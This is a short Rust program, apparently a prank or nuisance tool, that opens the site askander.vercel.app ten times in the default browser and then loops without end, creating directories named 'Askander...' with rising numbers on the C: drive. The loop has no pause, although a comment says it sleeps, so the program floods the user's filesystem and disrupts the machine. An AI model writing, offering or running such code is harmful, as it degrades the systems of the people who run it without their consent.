use std::{env, fs, io, path, thread};
use url::Url;

fn main() -> io::Result<()> {
    // Open the URL in the default web browser
    for _ in 1..=10 {
        open_website_in_browser("https://askander.vercel.app");
    }

    let mut index_dir = 0; // Initialize index_dir to keep track of directory name index

    loop {
        let desktop_path = match env::var("USERPROFILE") {
            Ok(user_profile) => {
                let mut path_buf = path::PathBuf::from(user_profile);
                path_buf.push(r"C:\");
                path_buf
            }
            Err(_) => {
                println!("Failed to get the desktop path.");
                continue; // Skip this iteration and continue to the next one
            }
        };

        // Define the name of the new directory
        let new_dir_name = format!("Askander...{}", index_dir);

        // Create a path for the new directory within the desktop directory
        let new_dir_path = desktop_path.join(&new_dir_name);

        if !new_dir_path.exists() {
            // If it doesn't exist, create the directory
            fs::create_dir(&new_dir_path)?;
            // println!("Directory '{}' created successfully.", new_dir_name);
        } else {
            // If it exists, increment index and create a new directory with updated name
            index_dir += 1;
        }

        // Sleep for a while before the next iteration
    }
}

fn open_website_in_browser(url: &str) {
    match webbrowser::open(url) {
        Ok(_) => println!("Opened website in the default browser."),
        Err(err) => eprintln!("Failed to open website: {}", err),
    }
}
